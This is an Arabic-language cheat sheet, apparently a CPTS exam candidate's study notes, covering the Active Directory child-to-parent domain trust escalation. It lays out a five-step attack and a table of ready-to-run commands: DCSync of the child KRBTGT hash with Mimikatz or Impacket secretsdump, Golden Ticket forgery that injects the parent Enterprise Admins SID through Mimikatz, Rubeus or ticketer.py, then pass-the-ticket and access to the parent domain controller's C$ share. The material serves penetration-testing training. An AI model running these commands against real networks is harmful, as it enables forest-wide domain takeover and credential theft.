⚔️ خوارزمية الهجوم:

١. تأكد من وجود صلاحيات DA على الـ Child Domain.

٢. اجمع الـ SIDs (دومين الابن، وكروب الـ EA بدومين الأب).

٣. استخرج KRBTGT Hash للابن (DCSync).

٤. اصنع Golden Ticket واحقن SID الأب بخانة SID History.

٥. احقن التذكرة (PTT) وادخل للـ Parent DC.

  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية:

  

|**الهدف**|**الأداة**|**الأمر**|
|---|---|---|
|جلب Child SID|PowerView|`Get-DomainSID`|
|جلب Child SID|Native AD|`(Get-ADDomain).DomainSID.Value`|
|جلب EA SID (Parent)|PowerView|`Get-DomainGroup -Domain PARENT.LOCAL -Identity "Enterprise Admins" \| select objectsid`|
|DCSync (Windows)|Mimikatz|`privilege::debug` ثم `lsadump::dcsync /user:CHILD\krbtgt`|
|DCSync (Linux)|Impacket|`secretsdump.py CHILD.LOCAL/user:pass@CHILD_IP -just-dc-user CHILD/krbtgt`|
|تزوير التذكرة (Windows)|Mimikatz|`kerberos::golden /user:x /domain:CHILD.LOCAL /sid:CHILD_SID /krbtgt:HASH /sids:PARENT_EA_SID /ptt`|
|تزوير التذكرة (Windows)|Rubeus|`Rubeus.exe golden /rc4:HASH /domain:CHILD.LOCAL /sid:CHILD_SID /sids:PARENT_EA_SID /user:x /ptt`|
|تزوير التذكرة (Linux)|Impacket|`ticketer.py -nthash HASH -domain-sid CHILD_SID -domain CHILD.LOCAL -extra-sid PARENT_EA_SID hacker`|
|التحقق من التذاكر|CMD|`klist`|
|تنظيف التذاكر|CMD|`klist purge`|
|الدخول للهدف|CMD/SMB|`dir \\PARENT_DC_IP\c$`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة)

✅ كل المصطلحات الأساسية للـ Trust والتذاكر

✅ كيفية التفكير (decision trees لاستغلال الـ Trust)

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر بـ Mimikatz و PowerView)

✅ الـ bypasses والـ variations والفخوخ (مثل حذف ميميكاتز، أو تفعيل الفلترة)

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل امتحان الـ CPTS)

  

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪

---

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED          ║
║  [✓] AUTHORED BY: Hexsein · CPTS Candidate · Al-Nahrain Univ.       ║
║  [→] NEXT TARGET: SEC-22 — NEXT SECTION NAME HERE                   ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```